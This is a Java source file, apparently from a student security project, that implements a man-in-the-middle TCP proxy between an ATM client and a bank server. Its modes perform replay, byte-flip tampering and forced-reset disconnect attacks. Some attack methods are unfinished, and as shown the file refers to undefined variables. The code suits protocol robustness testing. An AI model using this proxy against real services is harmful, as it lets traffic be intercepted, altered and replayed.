import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Arrays;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.*;
public class MITM {

	private final int listenPort;
	private final String remoteHost;
	private final int remotePort;
	private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);

	public MITM(int listenPort, String remoteHost, int remotePort) {
		this.listenPort = listenPort;
		this.remoteHost = remoteHost;
		this.remotePort = remotePort;
	}

	public void start() throws IOException {
		ServerSocket serverSocket = new ServerSocket(listenPort);
		System.out.printf("Proxy listening on port %d, forwarding to %s:%d%n", listenPort, remoteHost, remotePort);
		Scanner sc = new Scanner(System.in);
		while (true) {
			System.out.println("Enter operation (r/t/f/p/d/n | 6/11) or 'quit' to exit:");
			String[] ops = sc.nextLine().split(" ");
			if (ops[0].equals("quit")) {
				break;
				// System.exit(0);
			}
			Socket clientSocket = serverSocket.accept();
			Socket serverSocketToRemote = new Socket(remoteHost, remotePort);
			System.out.printf("Accepted connection from %s, connected to remote.%n",
					clientSocket.getRemoteSocketAddress());
			switch (ops[0]) {
				case "r": // Replay attack
					System.out.printf("Initiating Replay Attack \n");
					new Thread(() -> replayAttack(clientSocket, serverSocketToRemote)).start();
					new Thread(() -> forwardData(serverSocketToRemote, clientSocket)).start();
					break;

				case "t": // Timeout attack
					System.out.printf("Initiating Timeout Attack \n");
					// new Thread(() -> timeoutAttack(clientSocket, serverSocketToRemote)).start();
					// new Thread(() -> timeoutAttack(serverSocketToRemote, clientSocket)).start();
					break;

				case "f": // Byte Flip attack
					System.out.printf("Initiating Byte Flip Attack \n");
					new Thread(() -> byteFlip(clientSocket, serverSocketToRemote)).start();
					// new Thread(() -> byteFlip(serverSocketToRemote, clientSocket)).start();
					new Thread(() -> forwardData(serverSocketToRemote, clientSocket)).start();
					break;

				case "p": // print packet size
					System.out.printf("Initiating Print Size of Packets \n");
					new Thread(() -> forwardDataSize(clientSocket, serverSocketToRemote)).start();
					new Thread(() -> forwardDataSize(serverSocketToRemote, clientSocket)).start();
					break;

				case "d": // Connect and Disconnect attack
					System.out.printf("Initiating Connect & Disconnect Attack\n");
					new Thread(() -> forwardData(serverSocketToRemote, clientSocket)).start();
					connectAndDisconnect(clientSocket, 500);
					new Thread(() -> forwardData(serverSocketToRemote, clientSocket)).start();
					break;
				case "n":
					switch (ops[1]) {
						case "6":
							new Thread(() -> forwardData(clientSocket, serverSocketToRemote)).start();
							new Thread(() -> forwardData(serverSocketToRemote, clientSocket)).start();
							break;
						case "11":
							new Thread(() -> forwardData(clientSocket, serverSocketToRemote)).start();
							new Thread(() -> forwardData(serverSocketToRemote, clientSocket)).start();
							break;
						default:
							System.out.println("incorrect argument. insert another:");
							break;
					}
					break;
				case "i": // weaker integrity attack
					// ligar ao servidor e fazer autenticacao normal e fazer um pedido de criacao de
					// conta
					new Thread(() -> connectAndAuthenticateWithBank(clientSocket, serverSocketToRemote)).start();
					new Thread(() -> connectAndAuthenticateWithATM(serverSocketToRemote, clientSocket)).start();
					break;
				default: // incorrect argument
					System.out.println("incorrect argument. insert another:");
					break;// op = sc.nextLine();
				/*
				 * new Thread(() -> forwardData(clientSocket, serverSocketToRemote)).start();
				 * new Thread(() -> forwardData(serverSocketToRemote, clientSocket)).start();
				 * break;
				 */
			}
		}
		sc.close();
		serverSocket.close();
	}

	private void connectAndAuthenticateWithATM(Socket serverSocketToRemote, Socket clientSocket) {
		// TODO Auto-generated method stub
		throw new UnsupportedOperationException("Unimplemented method 'connectAndAuthenticateWithATM'");
	}

	private void connectAndAuthenticateWithBank(Socket clientSocket, Socket serverSocketToRemote) {

		AuthFileLoader authFileLoader = new AuthFileLoader();
		authFileLoader.load(config.getAuthFile());

		AuthFileData authFileData = authFileLoader.getData();

		Key key = AESUtils.generateKey();
		byte[] keyBytes = AESUtils.getKeyBytes(key);

		SecurityContext securityContext = new SecurityContext(keyBytes, authFileData.getBankPublicKey());

		BankClient client = new BankClient(config.getIpAddress(), config.getPort(), securityContext);
		// TODO Auto-generated method stub
		throw new UnsupportedOperationException("Unimplemented method 'connectAndAuthenticate'");
	}

	private void forwardData(Socket inputSocket, Socket outputSocket) {
		try (InputStream in = inputSocket.getInputStream();
				OutputStream out = outputSocket.getOutputStream()) {

			byte[] buffer = new byte[4096];
			int bytesRead;
			boolean count = true;
			while ((bytesRead = in.read(buffer)) != -1) {
				out.write(buffer, 0, bytesRead);
				System.out.println(bytesRead);
				// if (count){//bytesRead < 100) {
				// count = false;
				// System.out.println(Arrays.toString(buffer));
				// }
				out.flush();
			}
		} catch (IOException e) {
			// Connection closed or error – terminate forwarding
		} finally {
			try {
				inputSocket.close();
			} catch (IOException ignored) {
			}
			try {
				outputSocket.close();
			} catch (IOException ignored) {
			}
		}
	}

	private void forwardDataSize(Socket inputSocket, Socket outputSocket) {
		try (InputStream in = inputSocket.getInputStream();
				OutputStream out = outputSocket.getOutputStream()) {

			byte[] buffer = new byte[4096];
			int bytesRead;
			while ((bytesRead = in.read(buffer)) != -1) {

				out.write(buffer, 0, bytesRead);
				// System.out.println(Arrays.toString(buffer));
				out.flush();

				if (buffer[0] == 109 && buffer[1] == 58) {
					// System.out.println(Arrays.toString(buffer));
					System.out.println(bytesRead);
				}
			}

		} catch (IOException e) {
		} finally {
			try {
				inputSocket.close();
			} catch (IOException ignored) {
			}
			try {
				outputSocket.close();
			} catch (IOException ignored) {
			}
		}
	}

	public static void connectAndDisconnect(Socket inputSocket, int delayMillis) {
		try {
			Thread.sleep(delayMillis);
			System.out.println("Disconnecting abruptly...");
			inputSocket.setSoLinger(true, 0); // Forces a TCP RST on close
			inputSocket.close();
		} catch (IOException | InterruptedException e) {
			e.printStackTrace();
		} finally {
			if (inputSocket != null && !inputSocket.isClosed()) {
				try {
					inputSocket.close();
				} catch (IOException ignored) {
				}
			}
		}
	}

	private void byteFlip(Socket inputSocket, Socket outputSocket) {
		try (InputStream in = inputSocket.getInputStream();
				OutputStream out = outputSocket.getOutputStream()) {

			byte[] buffer = new byte[4096];
			int bytesRead;
			int count = 0;
			byte[] delayedPacket;
			while ((bytesRead = in.read(buffer)) != -1) {
				if (count != 0) {
					out.write(buffer, 0, bytesRead);
					// System.out.println(Arrays.toString(buffer));
					out.flush();
				} else {
					delayedPacket = new byte[bytesRead];
					System.arraycopy(buffer, 0, delayedPacket, 0, bytesRead);

					System.out.println("\n Bytes Read: " + bytesRead);
					System.out.println("\n Original Array: ");
					System.out.println(Arrays.toString(buffer).substring(0, 100));

					delayedPacket[0] = (byte) 2;
					delayedPacket[1] = (byte) 5;
					System.out.println("\n Flipped indexes 0 and 1 of the Array to " + delayedPacket[0] + " and "
							+ delayedPacket[1] + "!\n");

					// System.out.println(delayedPacket.length);
					System.out.println(Arrays.toString(delayedPacket));
					System.out.println("\n Sending altered array...");
					out.write(delayedPacket, 0, bytesRead);
					out.flush();
				}
				count++;
			}
		} catch (IOException e) {
			// Connection closed or error – terminate forwarding
		} finally {
			try {
				inputSocket.close();
			} catch (IOException ignored) {
			}
			try {
				outputSocket.close();
			} catch (IOException ignored) {
			}
		}
	}

	private void replayAttack(Socket inputSocket, Socket outputSocket) {
		try (InputStream in = inputSocket.getInputStream();
				OutputStream out = outputSocket.getOutputStream()) {

			byte[] buffer = new byte[4096];
			int bytesRead;
			int messageCount = 0;

			while ((bytesRead = in.read(buffer)) != -1) {
				messageCount++;
				// Immediately forward original message
				out.write(buffer, 0, bytesRead);
				out.flush();

				// Make a copy of the message to replay later
				byte[] messageCopy = new byte[bytesRead];
				System.arraycopy(buffer, 0, messageCopy, 0, bytesRead);

				// If it's one of the first 2 client messages, schedule replay
				if (messageCount == 1 || messageCount == 2) {
					int finalMessageCount = messageCount;
					scheduler.schedule(() -> {
						try {
							out.write(messageCopy);
							out.flush();
							System.out.println(
									"Replayed client message #" + finalMessageCount + " of size " + messageCopy.length);
						} catch (IOException e) {
							try {
								outputSocket.close();
							} catch (IOException e1) {
								// TODO Auto-generated catch block
								// e1.printStackTrace();
							}
							// e.printStackTrace();
						}
					}, 20, TimeUnit.MILLISECONDS);
				}
			}

		} catch (IOException | RejectedExecutionException e) {
			// Connection closed or error – terminate forwarding
		} finally {
			try {
				inputSocket.close();
			} catch (IOException ignored) {
			}
			try {
				outputSocket.close();
			} catch (IOException ignored) {
			}
			scheduler.shutdown();
		}
	}

	public static void main(String[] args) {
		if (args.length != 3) {
			System.err.println("Usage: java SimpleMITMProxy <listenPort> <remoteHost> <remotePort>");
			System.exit(1);
		}
		int listenPort = Integer.parseInt(args[0]);
		String remoteHost = args[1];
		int remotePort = Integer.parseInt(args[2]);

		try {
			new MITM(listenPort, remoteHost, remotePort).start();
		} catch (IOException e) {
			e.printStackTrace();
		}
		System.exit(0);
	}

	//-------------------------------------------------------------------------

}

